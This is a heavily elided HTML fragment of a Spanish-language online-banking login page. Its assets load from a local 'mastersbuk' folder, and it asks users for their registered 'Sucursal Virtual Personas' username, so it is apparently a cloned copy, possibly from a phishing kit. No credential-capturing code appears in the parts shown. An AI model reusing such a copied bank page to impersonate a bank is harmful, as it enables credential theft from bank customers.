...
<link href="./mastersbuk/styles.css" media="all" rel="stylesheet" type="text/css">
  
  <link href="./mastersbuk/bootstrap.css" media="all" rel="stylesheet" type="text/css">  

	

	<link href="./mastersbuk/jquery-ui.css" media="all" rel="stylesheet" type="text/css"> 
   	<link href="./mastersbuk/ui.css" media="all" rel="stylesheet" type="text/css">
  	<script>
									...
									<div id="contenido">
										<div class="mua-content-group-panel">
											<div class="mua-label-input">
												...
												<img src="mastersbuk/icc.png" style="width:20px;">
			...
			Ingrese el usuario que tiene registrado en la Sucursal Virtual Personas. Si no tiene un usuario asignado ingrese con su documento de identidad.
										...
										<div class="mua-divIcon">
											<div class="mua-divRow">
												<a class="mua-itemsIcons-btn" href="" target="_blank">
													...
													<div class="mua-divCell"><img src="mastersbuk/2es.png">&nbsp;
										...
										<div class="mua-divIcon">
											<div class="mua-divRow">
												<a class="mua-itemsIcons-btn" href="" target="_blank">
													...
													<div class="mua-divCell"><img src="mastersbuk/3es.png">&nbsp;
										...
										<div class="mua-divIcon">
											<div class="mua-divRow">
												<a class="mua-itemsIcons-btn" href="" target="_blank">
													...
													<div class="mua-divCell"><img src="mastersbuk/4es.png">&nbsp;
						...
						<div class="col-xs-12 col-sm-7 col-md-8">
							<div class="mua-embed-container-personal" id="banner-persona">
								<img src="mastersbuk/mansionesdelujo.png" alt="" border="0" class="img-responsive">
							</div>
